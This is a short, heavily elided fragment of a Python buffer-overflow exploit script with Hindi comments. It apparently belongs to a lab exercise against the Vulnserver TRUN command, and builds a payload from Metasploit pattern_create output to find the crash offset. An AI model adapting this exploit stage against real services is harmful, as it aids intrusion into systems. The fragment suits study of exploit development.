...
# Metasploit pattern_create output (offset)
...
# Poora payload string banakar use bytes (.encode()) mein convert kiya
payload = ('TRUN /.:/' + offset).encode()
...
try:
    ...
    print(f"Error: Unable to establish connection with Server. Details: {e}")
    sys.exit()
